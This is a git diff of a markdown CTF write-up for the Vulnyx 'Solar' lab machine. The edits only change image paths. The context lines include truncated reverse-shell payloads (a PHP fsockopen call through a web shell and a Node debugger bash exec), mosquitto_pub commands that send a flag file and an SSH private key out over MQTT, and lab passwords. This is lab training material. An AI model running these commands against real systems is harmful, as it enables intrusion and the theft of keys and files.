@@ -5,7 +5,7 @@ title: WriteUp Solar - Vulnyx
 slug: solar-writeup-vulnyx-en
 featured: false  
 draft: false  
-ogImage: "assets/solar/OpenGraph.png"  
+ogImage: "../../assets/images/solar/OpenGraph.png"  
 tags:  
   - writeup  
   - vulnyx
@@ -29,7 +29,7 @@ Below is the process for exploiting the Vulnyx Solar CTF. This is a challenging 
 
 I hope you find it useful.
 
-![Solar ASCII Art](/assets/solar/image.png)
+![Solar ASCII Art](../../assets/images/solar/image.png)
 
 ## Table of Contents
 
@@ -99,11 +99,11 @@ If we try to access port 80, we are redirected to `https://www.solar.nyx`, but w
 
 **www.solar.nyx**
 
-![www.solar.nyx](/assets/solar/image-1.png)
+![www.solar.nyx](../../assets/images/solar/image-1.png)
 
 **www.sunfriends.nyx**
 
-![www.sunfriends.nyx](/assets/solar/image-2.png)
+![www.sunfriends.nyx](../../assets/images/solar/image-2.png)
 
 ### Fuzzing
 
@@ -227,7 +227,7 @@ In a short time, we obtained the password `emily`, so we logged into the form at
 
 We analyzed the code at https://www.solar.nyx/dashboard.php.
 
-![www.solar.nyx/dashboard.php](/assets/solar/image-3.png)
+![www.solar.nyx/dashboard.php](../../assets/images/solar/image-3.png)
 
 ```html
 <!DOCTYPE html>
@@ -385,15 +385,15 @@ We connected to the server using an MQTT client and subscribed to the `#` topic,
 https://mqttx.app/downloads
 https://github.com/emqx/MQTTX
 
-![MQTT user configuration](/assets/solar/image-4.png)
+![MQTT user configuration](../../assets/images/solar/image-4.png)
 
 We observed that the MQTT client starts receiving the same data shown on the dashboard.
 
-![alt text](/assets/solar/image-4-old.png)
+![alt text](../../assets/images/solar/image-4-old.png)
 
 If we publish data to the `data` topic, we can see it reflected in `dashboard.php`.
 
-![alt text](/assets/solar/image-5-old.png)
+![alt text](../../assets/images/solar/image-5-old.png)
 
 We sent a high consumption value and saw how the graph bars moved. The page code shows that we can perform an XSS (Cross-Site Scripting) attack, as it uses only `innerHTML` without sanitizing the `solarEnergy` and `consumedEnergy` properties of the sent JSON.
 
@@ -787,7 +787,7 @@ cat base64pdf1.txt | base64 -d > document.pdf
 
 If we view the document, we can see the XSS injection we sent.
 
-![PDF XSS](/assets/solar/image-6.png)
+![PDF XSS](../../assets/images/solar/image-6.png)
 
 ```bash
 ─$ exiftool document.pdf     
@@ -897,7 +897,7 @@ $ cat base64pdf3.txt | base64 -d > document3.pdf
 
 We open it and obtain another base64 code, this time from the PHP file loaded locally by the server.
 
-![alt text](/assets/solar/image-7.png)
+![alt text](../../assets/images/solar/image-7.png)
 
 ### Step 5
 
@@ -971,29 +971,29 @@ if (PHP_VERSION_ID < 70300) {
 }
 ...
 ```
-![Admin Login](/assets/solar/image-8.png)
+![Admin Login](../../assets/images/solar/image-8.png)
 
 ## RCE
 
 Analyzing the source code of `/var/www/sunfriends.nyx/server.php`, we observe that the user credentials are used for form validation and for connecting to the MQTT service.
 
-![Server Administration Panel](/assets/solar/image-10.png)
+![Server Administration Panel](../../assets/images/solar/image-10.png)
 
 We access `https://www.sunfriends.nyx/server.php` with the obtained credentials `5up3r:bloods`, and we also connect to the MQTT server using the same credentials, subscribing to all topics `#`.
 
-![MQTTX Config](/assets/solar/image-5.png)
+![MQTTX Config](../../assets/images/solar/image-5.png)
 
 We can see that we receive all messages from the `data` and `record` topics, and when we execute a command, we also receive messages from the `server/command/output` topic.
 
-![alt text](/assets/solar/image-11.png)
+![alt text](../../assets/images/solar/image-11.png)
 
 We attempt to publish data to various topics such as `server/command/info`, `server/command/add`, `server/command/new`, ... and when we publish to **server/command/new**, we receive a message in the `server/command/error` topic that we did not send.
 
-![command](/assets/solar/image-28.png)
+![command](../../assets/images/solar/image-28.png)
 
 We add the **name** parameter to the JSON sent to the `server/command/new` topic.
 
-![command2](/assets/solar/image-29.png)
+![command2](../../assets/images/solar/image-29.png)
 
 We also add the `cmd` parameter, and we no longer receive any errors.
 
@@ -1037,7 +1037,7 @@ https://www.solar.nyx/records/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28
 
 We now have a `shell` with `www-data`.
 
-![alt text](/assets/solar/image-13.png)
+![alt text](../../assets/images/solar/image-13.png)
 
 ## www-data to Lenam
 
@@ -1067,7 +1067,7 @@ We find the flag at `/home/lenam/user.txt` and also some SSH keys. We subscribe 
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/user.txt
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.ssh/id_ed25519
 ```
-![alt text](/assets/solar/image-14.png)
+![alt text](../../assets/images/solar/image-14.png)
 
 The key is encrypted, and the `passphrase` is strong; it is not found in `rockyou.txt`.
 
@@ -1183,11 +1183,11 @@ We sent it to the MQTT server:
 doas -u lenam /usr/bin/mosquitto_pub -L mqtt://5up3r:bloods@localhost:1883/filtrate -f /home/lenam/.local/share/nano/search_history
 ```
 
-![Leaked Passphrase](/assets/solar/image-15.png)
+![Leaked Passphrase](../../assets/images/solar/image-15.png)
 
 We logged in with lenam's SSH key and the passphrase `CzMO48xpwof8nvQ6JUhF` via SSH.
 
-![SSH Lenam](/assets/solar/image-16.png)
+![SSH Lenam](../../assets/images/solar/image-16.png)
 
 ## From lenam to julian
 
@@ -1203,13 +1203,13 @@ permit setenv { PATH } julian as root cmd /usr/local/bin/backups
 
 We found the `/home/lenam/.password-store` directory where `pass`, a password manager, typically stores passwords.
 
-![pass test](/assets/solar/image-17.png)
+![pass test](../../assets/images/solar/image-17.png)
 
 We can see that lenam uses it and has several stored passwords. We cannot view them because a passphrase is required. The passphrase we used for the SSH key does not work. Normally, this software uses a GPG key to secure the vault.
 
 We found 2 GPG keys in the `/home/lenam/.gnupg/private-keys-v1.d/` directory.
 
-![alt text](/assets/solar/image-18.png)
+![alt text](../../assets/images/solar/image-18.png)
 
 ### Cracking GPG 2.2
 
@@ -1455,7 +1455,7 @@ debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/ba
 
 We obtain a `revshell` with the `julian` user.
 
-![revshell julian](/assets/solar/image-19.png)
+![revshell julian](../../assets/images/solar/image-19.png)
 
 ## From julian to root
 
@@ -1475,7 +1475,7 @@ The `julian` user can execute the `/usr/local/bin/backups` binary as `root`, pre
 
 We find a JPG image in the user's directory. We transfer it to our machine using `curl` and the Python `uploadserver` module.
 
-![uploadserver](/assets/solar/image-20.png)
+![uploadserver](../../assets/images/solar/image-20.png)
 
 With `stegcracker` and `rockyou.txt`, we discover the password `teresa` within a few seconds and extract the information.
 
@@ -1520,7 +1520,7 @@ https://malbolge.doleczek.pl/
 
 We copied the `Malbolge` code from the image and ran it.
 
-![julian password](/assets/solar/image-21.png)
+![julian password](../../assets/images/solar/image-21.png)
 
 We find `julian`'s password: `tk8QaHUi3XaMLYoP1BpZ`.
 
@@ -1650,11 +1650,11 @@ We use [CyberChef](https://gchq.github.io/CyberChef/) and apply the `Magic` reci
 
 After some processing, CyberChef decodes it as hexadecimal followed by XOR with key `69`.
 
-![CyberChef 1](/assets/solar/image-22.png)
+![CyberChef 1](../../assets/images/solar/image-22.png)
 
 It reveals the name of a library `libbackup.so`. We do the same for the longer code `0a1b0c081d0c360a0604191b0c1a1a0c0d360b080a021c19`, encoded similarly with the same XOR key.
 
-![CyberChef 2](/assets/solar/image-23.png)
+![CyberChef 2](../../assets/images/solar/image-23.png)
 
 We find the library name `libbackup.so` and what seems to be a function name `create_compressed_backup`.
 
